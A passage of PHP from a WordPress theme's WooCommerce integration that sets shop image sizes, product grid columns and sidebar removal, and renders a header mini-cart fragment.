		global $pagenow;
		if( is_admin() && isset($_GET['activated']) && 'themes.php' == $pagenow ) {
			update_option('shop_catalog_image_size', array('width' => 400, 'height' => '', 0));
			update_option('shop_single_image_size', array('width' => 550, 'height' => '', 0));
			update_option('shop_thumbnail_image_size', array('width' => 150, 'height' => '', 0));
		}
	}

	add_theme_support( 'woocommerce' );

	add_action( 'woocommerce_before_shop_loop_item_title', 'mtheme_woocommerce_template_loop_second_product_thumbnail', 11 );
	// Display the second thumbnail on Hover
	function mtheme_woocommerce_template_loop_second_product_thumbnail() {
		global $product, $woocommerce;

		$attachment_ids = $product->get_gallery_image_ids();

		if ( $attachment_ids ) {
			$secondary_image_id = $attachment_ids['0'];
			echo wp_get_attachment_image( $secondary_image_id, 'shop_catalog', '', $attr = array( 'class' => 'mtheme-secondary-thumbnail-image attachment-shop-catalog woo-thumbnail-fadeOutUp' ) );
		}
	}

	if ( !is_admin() ) {
		add_filter( 'post_class', 'mtheme_product_has_many_images' );
	}
	// Add pif-has-gallery class to products that have a gallery
	function mtheme_product_has_many_images( $classes ) {
		global $product;

		$post_type = get_post_type( get_the_ID() );

		if ( $post_type == 'product' ) {

			$attachment_ids = $product->get_gallery_image_ids();
			if ( $attachment_ids ) {
				$secondary_image_id = $attachment_ids['0'];
				$classes[] = 'mtheme-hover-thumbnail';
			}
		}

		return $classes;
	}
	// Remove sidebars from Woocommerce generated pages
	function remove_sidebar_shop() {
		$shop_layout = false;
		$shop_layout = of_get_option('mtheme_wooarchive_fullwidth');
		if (MTHEME_DEMO_STATUS) {
			if (isSet($_GET['shop_layout'])) {
				$shop_layout = mtheme_demo_data_fetch($_GET['shop_layout']);
				if ($shop_layout=="shop_fullwidth") {
					$shop_layout=1;
				}
			}
		}
		if ( is_shop() && $shop_layout ) {
	    	remove_action('woocommerce_sidebar', 'woocommerce_get_sidebar');
	    }
		if ( mtheme_page_is_woo_shop() ) {
			$woo_shop_post_id = get_option( 'woocommerce_shop_page_id' );
			$mtheme_pagestyle= get_post_meta($woo_shop_post_id, MTHEME . '_pagestyle', true);
			if ($mtheme_pagestyle=="nosidebar") {
				remove_action('woocommerce_sidebar', 'woocommerce_get_sidebar');
			}
		}
	    if ( is_product() ) {
	    	remove_action('woocommerce_sidebar', 'woocommerce_get_sidebar');
	    }
	    if ( is_product_category() && $shop_layout ) {
	    	remove_action('woocommerce_sidebar', 'woocommerce_get_sidebar');
	    }
	}
	
	add_action('template_redirect', 'remove_sidebar_shop');

	add_filter( 'woocommerce_breadcrumb_home_url', 'woo_custom_breadrumb_home_url' );
	function woo_custom_breadrumb_home_url() {
		if (MTHEME_DEMO_STATUS) {
			$home_url_path = esc_url( add_query_arg($_GET ,home_url('/shop/')) );
		} else {
			$home_url_path = home_url('/shop/');
		}
		$home_url_path = esc_url($home_url_path);
		return $home_url_path;
	}
	function mtheme_woocommerce_category_add_to_products(){

	    $product_cats = wp_get_post_terms( get_the_ID(), 'product_cat' );

	    if ( $product_cats && ! is_wp_error ( $product_cats ) ){

	        $single_cat = array_shift( $product_cats );

	        echo '<h4 itemprop="name" class="product_category_title"><span>'. $single_cat->name . '</span></h4>';

		}
	}
	add_action( 'woocommerce_single_product_summary', 'mtheme_woocommerce_category_add_to_products', 2 );
	add_action( 'woocommerce_before_shop_loop_item_title', 'mtheme_woocommerce_category_add_to_products', 12 );

	function mtheme_remove_cart_button_from_products_arcvhive(){
		remove_action( 'woocommerce_after_shop_loop_item', 'woocommerce_template_loop_add_to_cart', 10 );
	}
	//add_action('init','mtheme_remove_cart_button_from_products_arcvhive');

	function mtheme_remove_archive_titles() {
		return false;
	}
	add_filter('woocommerce_show_page_title', 'mtheme_remove_archive_titles');

	add_action( 'wp_enqueue_scripts', 'mtheme_remove_woocommerce_styles', 99 );
	function mtheme_remove_woocommerce_styles() {
		wp_dequeue_style( 'woocommerce_prettyPhoto_css' );
		wp_dequeue_script( 'prettyPhoto-init' );
	}

	// Display 12 products per page.
	add_filter( 'loop_shop_per_page', create_function( '$cols', 'return 12;' ), 20 );

	// Change number or products per row to 3
	add_filter('loop_shop_columns', 'mtheme_loop_columns');
	if (!function_exists('mtheme_loop_columns')) {
		function mtheme_loop_columns() {
			$product_count = 3;
			$shop_layout = false;
			$shop_layout = of_get_option('mtheme_wooarchive_fullwidth');

			if (MTHEME_DEMO_STATUS) {
				if (isSet($_GET['shop_layout'])) {
					$shop_layout = mtheme_demo_data_fetch($_GET['shop_layout']);
					if ($shop_layout=="shop_fullwidth") {
						$shop_layout=1;
					}
				}
			}
			if ( is_shop() && $shop_layout ) {
				$product_count = 4;
			}
			if ( mtheme_page_is_woo_shop() ) {
				$woo_shop_post_id = get_option( 'woocommerce_shop_page_id' );
				$mtheme_pagestyle= get_post_meta($woo_shop_post_id, MTHEME . '_pagestyle', true);
				if ($mtheme_pagestyle=="nosidebar") {
					$product_count = 4;
				}
			}
			if ( is_product_category() && $shop_layout ) {
				$product_count = 4;
			}
			return $product_count;
		}
	}

	// Remove rating from archives
	function mtheme_remove_ratings_loop(){
		remove_action( 'woocommerce_after_shop_loop_item_title', 'woocommerce_template_loop_rating', 5 );
	}
	add_action('init','mtheme_remove_ratings_loop');

	remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_title', 5 );

	if ( !of_get_option('mtheme_woocart_menu') ) {
		add_action('mtheme_header_woocommerce_shopping_cart_counter','mtheme_woocommerce_item_count', 10, 2);
		add_filter('woocommerce_add_to_cart_fragments', 'mtheme_woo_add_to_cart_fragment');
	}
	if (!function_exists('mtheme_woocommerce_item_count')) {
		function mtheme_woocommerce_item_count() {
			 
			global $woocommerce;
			if (isSet($woocommerce)) {
				if (isSet($woocommerce->cart)) {
					?>
			<div class="mtheme-header-cart cart">
				<span class="header-cart header-cart-toggle"><i class="feather-icon-cross"></i></span>
				<?php
				if ( $woocommerce->cart->cart_contents_count==0 ) {
				?>
				<div class="cart-contents">
						<div class="cart-empty">
						<?php _e('Your cart is currently empty.','mthemelocal'); ?>
						</div>		
				</div>		
				<?php
				}
				?>
			</div>
			<?php
				}
			}
		 
		}
	}
	if (!function_exists('mtheme_woo_add_to_cart_fragment')) {
		function mtheme_woo_add_to_cart_fragment( $fragments ) {
			global $woocommerce;

			ob_start();
			?>
			<div class="mtheme-header-cart cart">
				<span class="header-cart-close"><i class="feather-icon-cross"></i></span>
				<?php
				if ( $woocommerce->cart->cart_contents_count==0 ) {
				?>
				<div class="cart-contents">
						<div class="cart-empty">
						<?php _e('Your cart is currently empty.','mthemelocal'); ?>
						</div>		
				</div>		
				<?php
				}
				?>
				<?php if(!$woocommerce->cart->cart_contents_count): ?>

				<?php else: ?>
				<div class="cart-contents">
					<?php foreach($woocommerce->cart->cart_contents as $cart_item): ?>
					<div class="cart-elements clearfix">
						<a href="<?php echo get_permalink($cart_item['product_id']); ?>">
						<div class="cart-element-image">
							<?php $thumbnail_id = ($cart_item['variation_id']) ? $cart_item['variation_id'] : $cart_item['product_id']; ?>
							<?php echo get_the_post_thumbnail($thumbnail_id, 'gridblock-tiny'); ?>
						</div>
						<div class="cart-content-text">
							<span class="cart-title"><?php echo get_the_title($cart_item['product_id']); ?></span>
							<span class="cart-item-quantity-wrap"><span class="cart-item-quantity"><?php echo $cart_item['quantity']; ?> x </span><?php echo $woocommerce->cart->get_product_subtotal($cart_item['data'], 1); ?></span>
						</div>
						</a>
					</div>
					<?php endforeach; ?>
					<div class="cart-content-checkout">
						<div class="cart-view-link"><a href="<?php echo get_permalink(get_option('woocommerce_cart_page_id')); ?>"><?php _e('View Cart', 'mthemelocal'); ?></a></div>
						<div class="cart-checkout-link"><a href="<?php echo get_permalink(get_option('woocommerce_checkout_page_id')); ?>"><?php _e('Checkout', 'mthemelocal'); ?></a></div>
					</div>
				</div>
				<?php endif; ?>
			</div>
			<?php
			$header_cart = ob_get_clean();
			$fragments['div.cart'] = $header_cart;

			return $fragments;
		}
	}
}
?>